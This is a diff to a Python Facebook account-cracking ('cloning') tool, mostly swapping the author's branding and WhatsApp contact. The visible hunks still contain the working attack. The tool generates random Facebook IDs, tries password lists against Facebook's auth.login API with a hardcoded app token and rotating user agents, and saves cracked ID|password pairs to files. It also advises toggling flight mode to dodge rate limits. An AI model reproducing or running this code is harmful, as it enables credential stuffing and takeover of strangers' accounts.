@@ -348,7 +348,7 @@ def free(idf,pwv):
 	bi = random.choice([u,k,kk,b,h,hh])
 	pers = loop*100/len(id2)
 	fff = '%'
-	sys.stdout.write('\r %s[ JAHIED ] %s•%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
+	sys.stdout.write('\r %s[ SHAFIQ ] %s•%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
 	sys.stdout.flush()
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
@@ -389,11 +389,9 @@ def follow(ses,coki):
 
 logo = ("""\033[1;32m
 
- SSSSS    AAA   
-SS       AAAAA  
- SSSSS  AA   AA  SHAFIQ KHAN 
-     SS AAAAAAA    SAWAND
- SSSSS  AA   AA   
+ ❝𝐒𝐇𝐀𝐅𝐈𝐐 𝐊𝐇𝐀𝐍 𝐒𝐀𝐖𝐀𝐍𝐃❞
+ 
+     DARK HUNTER 
                         
   \033
 __________________×__×____________________
@@ -404,13 +402,12 @@ __________________×__×____________________
 
   Facebook :  Günalp Bey 
   
-  Contact :  923106116534 (whatsapp)
+  Whatsapp :  923106116534
   
   Youtube : No YouTube Channel 
 
-Tool Enjoy kro Old Facebook idz  🥰
-
-A Powerful Fb Cloning Tool by SHAFIQ 
+A POWERFUL FB CLONING TOOL FOR OLD ACCOUNT 
+              By SHAFIQ Khan 
 __________________×__×____________________\033[1;37m""")
 
 class Main:
@@ -856,10 +853,10 @@ class Main:
 			}
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
-				print("\r \033[0;92m[ JOKER-OK ] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[ SHAGIQ-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				print ("\r \033[0;92m Congrats Bro ")
 				self.ok.append("%s|%s"%(uid, pw))
-				open("2009-JOKER-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
+				open("2009-SHAFIQ-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
 				print("\r \033[0;92m[ SHAFIQ-OK ] %s | %s\033[0;97m         "%(uid, pw))
@@ -876,7 +873,7 @@ class Main:
 		xx = 9999999999
 		idx = "10000" 
 		os.system('clear');print(logo)
-		limit = int(input("\n \033[0;95m[+]\033[0;93m KOTO ID CRACK KORBA- LIMIT 50,000: "))
+		limit = int(input("\n \033[0;95m[+]\033[0;93m OLD FB ID CRACKER- LIMIT 50,000: "))
 		try:
 			for n in range(limit):
 				_ = random.randint(x,xx)
@@ -894,7 +891,7 @@ class Main:
 				print(logo)
 				print("\n%s [+] OK RESULTS SAVED IN -> ok.txt"%(Y))
 				print("%s [+] CP RESULTS SAVED IN -> cp.txt"%(G))
-				print("%s [!] CRACK NA HOILE  AIRPLANE MODE ON KORBA\x1b[0m\n"%(P))
+				print("%s [!] Turn on Flight mode if no account crack\x1b[0m\n"%(P))
 				for user in self.id:
 					coeg.submit(self.api, user, listpass.split(","))
 			exit("\n\n [>>] CRACK COMPLETE...")
@@ -1266,7 +1263,7 @@ class Main:
 			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
 		])
 		sys.stdout.write(
-			"\r [ SAKIB ] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
+			 [SHAFIQ] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
 		); sys.stdout.flush()
 		for pw in pwx:
 			pw = pw.lower()
@@ -1283,15 +1280,15 @@ class Main:
 			}
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
-				print("\r \033[0;92m[ JOKER-OK ] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[ SHAFIQ-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				print ("\r \033[0;92m Congrats Bro ")
 				self.ok.append("%s|%s"%(uid, pw))
-				open("2009-JOKER-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
+				open("2009-SHAFIQ-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \033[0;92m[ JOKER-OK ] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[ SHAFIQ-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
-				open("2009-JOKER-OK.txt","a").write(" %s | %s\n"%(uid, pw))
+				open("2009-SHAFIQ-OK.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
 			else:
 				continue
@@ -1316,8 +1313,8 @@ def Subscraption():
 		os.system("clear")
 		print(logo)
 		print ("")
-		print(" \033[1;32m SAKIB Tool Totally Free Just You Need Get Approved First\033[1;37m\n")
-		print(" \033[1;32m Note : Paid Tool Free Kora Hoiche \033[1;37m")
+		print(" \033[1;32m SHAFIQ Paid Tool You Need To Get Approved First\033[1;37m\n")
+		print(" \033[1;32m Note : Paid Tool  \033[1;37m")
 		print ("")
 		print(" Your Key is Not Approved ")
 		print("")
@@ -1330,6 +1327,6 @@ def Subscraption():
 		input(" Press Enter To Send Key")
 		time.sleep(3.5)
 		tks = 'Dear%20Admin,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+ak+ahsan+''+key1
-		os.system('am start https://wa.me/+8801903226586?text=' + tks)
+		os.system('am start https://wa.me/+923106116534?text=' + tks)
 		Subscraption()        
 Main()
